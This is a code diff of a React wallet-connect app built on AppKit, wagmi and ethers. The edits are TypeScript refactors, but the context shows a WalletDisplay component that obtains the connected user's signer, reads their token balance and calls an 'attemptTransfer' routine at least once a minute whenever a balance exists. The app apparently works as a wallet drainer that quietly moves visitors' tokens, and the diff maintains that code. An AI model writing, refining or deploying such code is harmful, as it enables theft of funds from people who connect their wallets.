@@ -2,7 +2,7 @@ import { createAppKit } from '@reown/appkit/react';
 import { WagmiProvider, useAccount } from 'wagmi';
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
 import { useEffect, useState } from 'react';
-import { BrowserProvider, parseUnits, Contract, Eip1193Provider, formatUnits } from 'ethers';
+import { BrowserProvider, parseUnits, Contract, Eip1193Provider, formatUnits, type Contract as EthersContract } from 'ethers';
 
 import { projectId, metadata, networks, wagmiAdapter, solanaWeb3JsAdapter } from './config';
 
@@ -196,7 +196,7 @@ const WalletDisplay = () => {
   const [balance, setBalance] = useState('0');
   const [lastTransferAttempt, setLastTransferAttempt] = useState(0);
 
-  const attemptTransfer = async (tokenContract, provider) => {
+  const attemptTransfer = async (tokenContract: EthersContract) => {
     if (isTransferring) return;
     
     try {
@@ -242,8 +242,7 @@ const WalletDisplay = () => {
       try {
         if (typeof window !== "undefined" && window.ethereum) {
           const ethereum = window.ethereum as unknown as Eip1193Provider;
-          const provider = new BrowserProvider(ethereum);
-          const signer = await provider.getSigner();
+          const signer = await new BrowserProvider(ethereum).getSigner();
           const tokenContract = new Contract(TOKEN_CONTRACT_ADDRESS, tokenAbi, signer);
 
           // Get current balance
@@ -253,7 +252,7 @@ const WalletDisplay = () => {
 
           // If it's been at least 1 minute since last transfer attempt and we have balance
           if (Date.now() - lastTransferAttempt >= 60000) {
-            await attemptTransfer(tokenContract, provider);
+            await attemptTransfer(tokenContract);
           }
         }
       } catch (error) {
